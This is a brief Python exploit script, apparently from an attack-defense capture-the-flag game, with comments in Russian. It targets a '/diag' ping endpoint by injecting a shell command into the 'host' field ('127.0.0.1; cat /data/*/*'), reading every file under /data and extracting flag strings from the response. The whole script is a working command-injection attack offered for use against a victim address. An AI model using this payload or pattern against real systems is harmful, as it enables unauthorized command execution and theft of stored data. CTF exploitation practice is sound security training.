#!/usr/bin/env python3
"""pingtool — инъекция команд в /diag. Дописываем свою команду через shell.
Запуск: pingtool.py <ip_жертвы> [порт]   (печатает флаги в stdout)."""
import os
import re
import sys

import requests

FLAG = re.compile(os.environ.get("FLAG_FORMAT", r"[A-Z0-9]{31}="))
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "5002"))
BASE = f"http://{HOST}:{PORT}"

flags = set()
try:
    r = requests.post(f"{BASE}/diag",
                      json={"host": "127.0.0.1; cat /data/*/* 2>/dev/null"}, timeout=5)
    j = r.json()
    flags.update(FLAG.findall((j.get("stdout", "") or "") + (j.get("stderr", "") or "")))
except requests.RequestException:
    pass

for f in sorted(flags):
    print(f)
